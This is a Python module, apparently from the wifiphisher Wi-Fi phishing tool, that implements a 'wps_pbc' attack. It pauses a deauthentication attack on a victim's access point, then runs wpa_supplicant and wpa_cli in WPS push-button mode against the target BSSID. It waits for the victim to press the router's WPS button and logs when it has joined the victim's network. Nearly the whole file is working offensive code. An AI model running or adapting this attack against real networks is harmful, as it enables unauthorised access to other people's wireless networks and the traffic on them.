from wifiphisher.common.constants import *
import time, threading, socket, fcntl, struct, subprocess


class Manage(object):

    """
    This class is used to determine which attack has been chosen.
    If the attack isn't valid it will throw an exception :
    NotValidAttack
    """

    def __init__(self, attack):

        """
        Setup the class with all the given arguments.

        :param self: A Manage object.
        :param attack: Which attack has been chosen.
        :type self: Manage
        :type attack: string
        :return: None
        """

        self.attack = attack
        self.attacks = ["wps_pbc"]
        self.log_file = "/tmp/wifiphisher-attacks.tmp"
        self.check()

    def check(self):

        """
        Check which attack has been chosen, if the attack
        is not valid raise NotValidAttack()
        """

        if not self.attack in self.attacks :
            raise NotValidAttack(self.attack, self.attacks)

    def provide(self):

        """
        Returns what is needed for the attack to run

        :param self: A Manage object
        :type self: Manage
        :return: what is needed for the attack to run
        :rtype: list
        """

        self.needs = "all"
        if self.attack == "wps_pbc":
            #pay attention to this order when you create an attack because this is the
            #the order that you're gonna recieve as parameter in your attack.
            #see WPS_PBC as example
            self.needs = ["deauth-object", "deauth_iface", "target_bssid"]

        return self.needs

    def run(self, needs):

        """
        This function start the attack passing as parameter
        what it got from pywifiphisher, if some parameter that
        are necessary for the attack to run are empty, None, or False
        raise the exception : DidNotProvide()
        If you are creating an attack make sure that your object has
        a start() function!
        """

        self.recv_needs = needs #Needs recieved from pywifiphisher
        for need in self.recv_needs : #Check if they're valid
            if not need or need == "" or need is None :
                raise DidNotProvide(self.needs, self.recv_needs)

        attack_name = self.attack
        if attack_name == "wps_pbc":
            self.attack = WPS_PBC(self.recv_needs, self.log_file)

        with open(self.log_file, "a+") as log_file: #Writing a log
            log_file.write('[' + T + '*' + W + '] ' + R + "ATTACK ACTIVATED : " +
                           G + attack_name)
        self.attack.start() #Start the attack

class WPS_PBC(object):
    def __init__(self, needs, log_file):

        """
        Setup the class with all the given arguments.

        :param self: A WPS_PBC object.
        :param log_file: The log file where to write outputs.
        :type self: WPS_PBC
        :type log_file: string
        :return: None

        Taking self.bssid, self.iface and self.deauth from Load()
        """

        self.deauth, self.iface, self.bssid = needs[0], needs[1], needs[2]
        self.conf_dir = "/etc/wpa_supplicant.conf"
        self.log_file = log_file

    def start(self):

        """
        This is the core of the attack
        """

        self.wpa_setup() #setup wpa_supplicant
        self.listener = threading.Thread(target=self.start_listen)
        self.listener.start() #start the listener as thread so then we stop it when we're done
        self.going = True
        while self.going : #just stay here until going != True
            continue
        self.tm.join()  #stop the timer
        self.listener.join()  #stop the listener

    def wpa_setup(self):

        """Setup"""

        sup = "sudo echo -e \"ctrl_interface=/var/run/wpa_supplicant\\"\
                "nctrl_interface_group=0\\nupdate_config=1\" > "+self.conf_dir #wpa_supplicant confs

        wpa_set = "sudo wpa_supplicant -B -Dwext -i"+self.iface+" -c"+self.conf_dir #Start wpa_supplicant
        self.iface_up() #sometimes the iface goes down after wpa_supplicant
        self.wpa_cli = "sudo wpa_cli -i "+self.iface+" wps_pbc "+self.bssid+" -B" #start listening for wps_pbc

        """Launching the commands"""

        subprocess.Popen([sup], shell=True)
        subprocess.Popen([wpa_set], shell=True)

    def start_listen(self):

        """
        This listener keep running waiting for the victim
        to press wps button. It will close if it's been
        waiting for more than 2 mins.
        ( routers provide the wps_pbc function for max 2 mins )
        """

        self.stop_deauth() #Stopping the deauth
        time.sleep(7) #give some time to the AP to come back

        self.tm = threading.Thread(target=self.check_if_connected)
        cli = subprocess.Popen(self.wpa_cli, shell=True, stdout=subprocess.PIPE, \
                                stdin=subprocess.PIPE, stderr=subprocess.PIPE) #start the wps listener
        self.tm.start() #start checking if we are connected

    def stop_deauth(self):

        """
        Stop deauthenticating
        """

        self.deauth.stop_deauthentication()

    def deauth_rest(self):

        """
        Restart the deauthentication
        """

        self.deauth.deauthenticate()

    def iface_up(self):

        """
        If the interface goes down
        """

        subprocess.Popen(["sudo ifconfig "+self.iface+" up"], shell=True)

    def check_if_connected(self):

        """
        This function will keep checking if we
        are successfully connected to the target AP
        """

        while 1:
            ip = self.check_ip() #check if we got an ip from the AP
            if not ip:
                time.sleep(1)
            else :
                self.done()

    #def timer(self):

    #    """
    #    This timer counts how many seconds passed
    #    from the start point, it checks if it's been more
    #    than two mins and if we are connected to the
    #    victim's AP.
    #    If it's been 2 mins or more stop everything.
    #    """

    #    secs = 0
    #    while secs < 120 : #while it's been less than 2mins
    #        ip = self.check_ip() #check if we got an ip from the AP
    #        if not ip:
    #            time.sleep(1)
    #            secs += 1.2
    #        else :
    #            self.done() #if we did we're done
    #    self.stop() #it's been more than 2mins


    def check_ip(self):

        """
        Returns the ip that we got or a False if
        we are not connected to the target AP

        :param self: A WPS_PBC object
        :type self: WPS_PBC
        :return: False or the ip we got
        :rtype: bool or string
        """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while 1:
            try :
                ip = socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(),
                    0x8915,
                    struct.pack('256s', self.iface[:15])
                )[20:24])
                break
            except IOError as e:
                if e.errno == 99:  #if we didn't get the ip return False
                    return False
                elif e.errno == 19: #if iface is down for some reasons
                    self.iface_up()
                    continue
                else :
                    return False
        return ip #return the ip we got



    def done(self):

        """
        This function will prompt a log to the user,
        set the self.going to False to terminate the attack
        """

        with open(self.log_file, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + G + "The WPS button has been pressed :" +
                           C + "You are now connected to "+self.bssid+" the fake AP is still running\n"+
                           "but the deauthentication attack and the WPS_PBC attack are not running anymore")
        self.going = False

    def stop(self):

        """
        The stop function it's different from the done()
        function because this runs only when 2mins are passed
        and we are still not connected to the victim's AP.
        This restart the deauthentication process and change
        the variable self.going to stop the attack.
        """

        self.deauth_rest()
        self.going = False

class DidNotProvide(Exception):

    """
    Exception class to raise if the needed variables and
    objects are not provided
    """

    def __init__(self, needs, recv_needs):

        message = ("Did not provide the right data for the attack to run, this is what "
                    "you've provided :\n"+str(recv_needs)+" and this is what it was needed : \n"+
                    str(needs))

        Exception.__init__(self, message)
class AttackAlreadyRunning(Exception):

    """
    Exception class to raise if an attack is already running
    """

    def __init__(self):

        message = ("An attack is currently running, you can't have"
                    "more than one attack running at the same time!\n")

        Exception.__init__(self, message)

class NotValidAttack(Exception):

    """
    Exception class to raise if the attack selected doesn't exitst.
    """

    def __init__(self, attack, attacks):

        message = ("The attack : "+attack+" isn't valid, check if the template\n"
                    "you are using is passing the right parameter via post request"
                    "the current attacks available are : \n"+str(attacks)+"\n"
                    "Make sure that in your post request after 'attack-mode=' you have "
                    "a valid attack")

        Exception.__init__(self, message)
